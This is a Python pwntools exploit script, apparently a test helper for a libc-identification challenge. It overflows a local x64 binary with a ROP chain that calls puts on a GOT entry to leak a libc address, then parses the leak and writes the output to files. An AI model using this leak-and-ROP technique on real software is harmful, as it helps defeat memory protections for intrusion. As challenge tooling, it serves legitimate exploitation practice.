from pwn import *

import time

import sys

target = process("./chall-test_localLibcId-2-x64")
gdb.attach(target, gdbscript="get_libc_puts_address")

payload = ""
payload += "000000000000000000000000000000000000000000000000000000000000"
payload += p32(0xdeadbeef)
payload += "00000000"
payload += p64(0x401233)
payload += p64(0x404018)
payload += p64(0x401060)
target.sendline(payload)
foundEnd = False
output = ""
while foundEnd == False:
	try:
		output += target.recvline()
	except:
		foundEnd = True
if len(output) == 0:
	outputFile = open("justifies", "w")
	outputFile.write("")
	outputFile.close()
	sys.exit(0)
time.sleep(1)
putsFile = open("far-cry", "r")
putsAddress = putsFile.read()
putsFile.close()
putsAddress = int(putsAddress, 16)
outputLines = output.split("\n")
if len(outputLines) == 1:
	leakLine = outputLines[0]
else:
	leakLine = outputLines[-2]
workingLeakLine = leakLine.strip("\n")
lineLength = 8
if len(workingLeakLine) < 8:
	lineLength = len(workingLeakLine)
hexValues = []
for i in range(1, lineLength + 1):
	currentLeak = str(workingLeakLine[-i:])
	currentAddress = u64(currentLeak + "\x00"*(8-len(currentLeak)))
	print(hex(currentAddress))
	if currentAddress == putsAddress:
		savedIndex = i
		break
finalFillerOutput = leakLine[:-savedIndex]
fillerOutput = outputLines[:-2]
fillerOutput.append(finalFillerOutput)
fillerOutput = "\\n".join(fillerOutput)
outputFile = open("justifies", "w")
outputFile.write(fillerOutput)
outputFile.close()
